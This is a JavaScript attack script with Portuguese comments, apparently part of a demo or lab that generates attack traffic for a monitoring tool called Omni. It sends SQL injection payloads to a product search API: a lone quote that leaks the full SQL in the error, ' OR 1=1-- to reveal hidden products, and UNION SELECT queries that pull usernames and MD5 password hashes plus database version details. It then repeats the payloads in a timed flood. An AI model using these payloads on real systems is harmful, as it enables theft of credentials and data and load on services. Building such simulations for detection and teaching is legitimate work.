// npm run ataque:sqli: injeção de SQL na busca de produtos. Mostra o que
// cada carga revela e depois repete as cargas por um tempo. No Omni aparece
// como 5xx em /api/busca e consultas com erro no PostgreSQL.
//   --taxa 5
//   --duracao 30s   repetição depois da demonstração; 0 pula

import { args, flood, seconds, send } from '../lib.js'

const o = args({ taxa: 5, duracao: '30s' })
const ip = '192.0.2.99'
// Cada carga diz o que mostrar da resposta: só o que não devia aparecer.
const cargas = [
  ["'", 'aspas sozinhas: a API devolve o erro do banco com o SQL inteiro'],
  ["' OR 1=1--", 'condição sempre verdadeira: aparecem os produtos ocultos', (rows) => rows.filter((r) => r.id > 22)],
  ["x' UNION SELECT id, usuario, senha_md5, papel, 0 FROM usuarios--", 'UNION: lê usuários e hashes de senha pela busca'],
  ["x' UNION SELECT 0, current_user, version(), current_database(), 0--", 'UNION: usuário, versão e nome do banco'],
]
const busca = (q) => send(`/api/busca?q=${encodeURIComponent(q)}`, { ip })

for (const [q, about, show = (rows) => rows] of cargas) {
  const r = await busca(q)
  console.log(`\n▶ ${about}\n  q = ${q}\n  HTTP ${r.status}`)
  if (r.status >= 500) console.log(`  erro: ${r.data.erro}\n  sql:  ${r.data.sql}`)
  else for (const row of show(r.data)) console.log(`  ${Object.values(row).join(' | ')}`)
}

const d = seconds(o.duracao)
if (d > 0) {
  console.log(`\nrepetindo as cargas a ${o.taxa}/s por ${o.duracao}…`)
  await flood({ name: 'sqli', rate: o.taxa, duration: d, next: (i) => busca(cargas[i % cargas.length][0]) })
}
